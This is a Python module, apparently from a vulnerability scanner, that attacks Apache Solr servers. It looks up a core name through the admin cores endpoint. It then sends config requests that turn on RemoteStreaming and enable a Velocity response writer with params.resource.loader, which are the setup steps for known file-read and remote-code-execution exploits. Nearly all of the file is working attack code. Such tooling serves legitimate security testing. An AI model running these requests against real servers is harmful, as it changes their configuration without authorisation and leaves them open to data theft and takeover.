#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.initial.config import config
import re

config_data_base = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
params_data_base = '''{"update-queryresponsewriter": {"startup": "lazy","name": "velocity","class": "solr.VelocityResponseWriter","template.base.dir": "","solr.resource.loader.enabled": "true","params.resource.loader.enabled": "true"}}'''

enable_payloads = [
    {
        'core_path': 'solr/admin/cores?indexInfo=false&wt=json', # * 获取数据库名称
        'config_path': 'solr/{}/config',                         # * 使用数据库名称开启RemoteStreaming功能
        'config_data': config_data_base,
        'params_data': params_data_base
    },
    {
        'core_path': 'admin/cores?indexInfo=false&wt=json',
        'config_path': '{}/config',
        'config_data': config_data_base,
        'params_data': params_data_base
    },
    {
        'core_path': 'cores?indexInfo=false&wt=json',
        'config_path': 'config',
        'config_data': config_data_base,
        'params_data': params_data_base
    }
]

def enable(client):
    ''' 用于开启Solr的RemoteStreaming或自定义模板(params.resource.loader.enabled) '''
    vul_info = {
        'app_name': 'ApacheSolr',
        'vul_type': 'Solr-Tool',
        'vul_id': 'Solr-enable',
    }

    headers = {
        'Content-Type': 'application/json'
    }
    
    for payload in enable_payloads:
        if config.get('Solr-params'):
            return

        core_path = payload['core_path']
        config_path = payload['config_path']
        config_data = payload['config_data']
        params_data = payload['params_data']
        
        res1 = client.request(
            'get',
            core_path,
            vul_info=vul_info
        )
        if res1 is None:
            return
        
        db_name = re.search(r'"name":".+"', res1.text, re.M|re.I)       # * 如果存在solr的数据库名称
        if db_name:
            db_name = db_name.group()
            db_name = db_name.replace('"name":', '')
            config.set('Solr-db_name', db_name.strip('"'))              # * 只保留双引号内的数据库名称
            
        if config.get('Solr-db_name'):
            # todo 2. 开启RemoteStreaming
            res2 = client.request(
                'post',
                config_path.format(config.get('Solr-db_name')),
                data=config_data,
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res2 is None:
                return
            
            if (res2.status_code == 200):
                config.set('Solr-RemoteStreaming', True)

            # todo 3. 开启params.resource.loader.enabled
            res3 = client.request(
                'post',
                config_path.format(config.get('Solr-db_name')),
                data=params_data,
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res3 is None:
                return

            if (res3.status_code == 200):
                config.set('Solr-params', True)
    return None
